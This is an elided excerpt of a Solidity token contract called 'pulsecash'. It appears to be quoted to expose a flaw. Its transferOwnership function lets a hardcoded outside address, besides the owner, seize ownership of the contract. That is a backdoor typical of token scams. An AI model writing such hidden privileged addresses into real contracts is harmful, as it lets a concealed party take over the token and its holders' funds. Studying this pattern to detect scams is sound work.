...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x8137AC5C99cb14cCD018DfB136D833728C47B1e0));
...
contract pulsecash is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "pulsecash";
